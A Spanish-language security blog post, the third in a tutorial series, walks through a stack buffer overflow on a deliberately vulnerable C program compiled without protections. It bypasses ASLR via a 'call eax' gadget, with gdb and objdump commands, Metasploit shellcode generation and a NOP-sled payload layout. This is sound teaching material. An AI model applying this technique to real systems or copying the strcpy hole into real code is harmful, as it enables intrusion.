@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Desbordando El Buffer en Linux X86 (III) - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="By [Q]3rV[0]Esta es la tercera parte de una serie de tutoriales para aprender a explotar el buffer en sistemas Linux x86. En el anterior apartado se &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-iii_14/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Desbordando El Buffer en Linux X86 (III)</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T12:27:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:27 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.entrebrumas.com/wp-content/uploads/2010/06/blue_by_splutphoto.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.entrebrumas.com/wp-content/uploads/2010/06/blue_by_splutphoto.jpg" height="450" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: right;"><b>By [Q]3rV[0]</b></div><div style="text-align: right;"><br /></div>Esta es la tercera  parte de una serie de tutoriales para aprender a  explotar el buffer en sistemas Linux x86. En el <a href="http://www.securitysignal.tk/2015/01/desbordando-el-buffer-en-linux-x86-ii.html">anterior</a> apartado se  logro encastrar codigo ejecutable y obtener una shell, pero para  lograrlo debimos desactivar previamente ASLR.  Como explique  anteriormente este sistema de seguridad nos dificulta un poco las cosas randomizando la memoria.<br /><br />Compilaremos el siguiente codigo que sera usado durante la realizacion de este tutorial.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ #include <stdio.h>#include <string.h> void funcion_vulnerable(char* input) {     char buffer[1000];     strcpy(buffer, input); } int main(int argc, char** argv) {     funcion_vulnerable(argv[1]);     return 0; }  ]]></script> Verificamos que ASLR se encuentra activo.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ cat /proc/sys/kernel/randomize_va_space 2 ]]></script> De otra manera lo activaremos.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ echo 2 > /proc/sys/kernel/randomize_va_space ]]></script> Ahora simplemente realizaremos los pasos descriptos en los anteriores capitulos. Compilamos el code.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ gcc -o vuln -fno-stack-protector -mpreferred-stack-boundary=2 -ggdb -z execstack vuln.c ]]></script> Presten atencion al flag -z execstack, esto simplemente vuelve ejecutable el stack ya que NX (Non-Exec) es otra proteccion que al igual que ASLR nos va a romper bastante las pelotas denegandonos la ejecucion de un shellcode en la memoria.  Pero de todas maneras se puede evadir, tema que se tocara en el proximo tuto.<br /><br />&nbsp;Buscamos la sobrescritura del EIP.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ r $(python -c 'print "\x41"*1004+"\x42"*4') ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/VsmMcJN.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/VsmMcJN.png" /></a></div><br />Hasta aca todo muy lindo, pero todavia tenemos que saltarnos ASLR.  Una manera de hacer esto es buscando dentro del binario alguna instruccion de llamada o salto (CALL/JMP) a algun registro. Por que si nos basamos en seguir el anterior tutorial donde sobrescribiamos el EIP con una direccion dentro de ESP que aputaba a un NOP Sled+Shellcode, simplemente no va a funcar, por el echo de que la memoria va a cambiar en cada ejecucion.  Esto podemos hacerlo con objdump.<br /><br />&nbsp;Buscaremos la existencia de alguna instruccion CALL<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ objdump -d vuln|grep call ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/WcOw5wZ.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/WcOw5wZ.png" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/2cbfPTg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/2cbfPTg.png" /></a></div><br />Perfecto, objdump nos arroja dos direcciones que llaman al registro EAX.<br /><ul><li>8048387&nbsp;</li><li>804840f&nbsp;</li></ul>Entonces se nos ocurre que si podemos escribir en EAX nuestro shellcode y pintar el EIP con la direccion CALL lograriamos realmente “pintarle la cara a ASLR”.  Bien, hay una parte del buffer en EAX?<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ x/100x $eax ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/8MiR1WD.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/8MiR1WD.png" /></a></div><br />Como se aprecia, logramos tocar el comienzo del registro, ahora solamente nos falta generar el payload.  Ahora si nos apoyaremos en MSF para moldear un Shellcode.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ msf > msfpayload linux/x86/exec CMD=/bin/bash C ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/b5EaI5R.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/b5EaI5R.png" /></a></div><br />El unico problema que surge, es que si miramos el shellcode, este contiene “badchars”, como por ejemplo la presencia de nullbytes \x00 que nos van a cortar la cadena.  Asi que le pasamos la salida a msfencode para ofuscar un poco el code.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ msf > msfpayload linux/x86/exec CMD=/bin/bash R|msfencode -a x86 -e x86/alpha_mixed -b 'x\00\x0d\x0a' -t c ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/Z4R607W.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/Z4R607W.png" /></a></div><br />Fijense en el flag -b de msfencode y entre comillas la lista de badchars a evadir.  Ahora tenemos el codigo limpio y listo para agregarlo al payload que quedara de la siguiente manera.<br /><br />Le restamos la longitud del Shellcode al buffer.<br /><br />1004-152=852<br /><br />Menos 400 NOPS que iran antes del EIP, quedando el vector de la siguiente manera.<br /><br />NOPS(452)+Shellcode(152)+NOPS(400)+EIP (call eax \x87\x83\x04\x08)<br /><br />Lanzamos el exploit&nbsp; <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/g1TDSom.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/g1TDSom.png" /></a></div><br />Logrando esquivar satisfactoriamente ASLR.</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T12:27:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:27 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-iii_14/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-iii_14/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-ii/" title="Previous Post: Desbordando el buffer en linux x86 (II)">&laquo; Desbordando el buffer en linux x86 (II)</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/14/escribiendo-un-auxiliar-para-msf/" title="Next Post: Escribiendo Un Auxiliar Para MSF">Escribiendo Un Auxiliar Para MSF &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
